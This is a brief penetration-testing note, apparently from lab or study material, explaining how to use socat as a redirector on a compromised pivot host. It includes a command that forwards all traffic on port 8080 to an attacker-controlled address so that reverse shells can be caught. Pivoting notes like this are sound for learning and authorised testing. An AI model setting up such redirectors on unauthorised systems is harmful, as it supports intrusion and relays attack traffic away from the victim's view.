Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts a redirector that can listen on one host and port and forward that data to another IP address and port



#### Setting up a redirector using socat

We can use socat to setup a redirector on the pivot box, that will redirect all traffic coming to a particular port to the attacker's machine

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.155:80
```


This command will make the pivot box listen on port 8080 for incoming traffic and redirect all data to 10.10.14.155 on port 80, which is controlled by the attacker. 


P.S: In the context of pivoting,  Socat only eliminates the need for setting up a remote port forward  to catch reverse shells. We would still need a dynamic port forwarding (either via SSH or chisel) to reach the target via the pivot box.
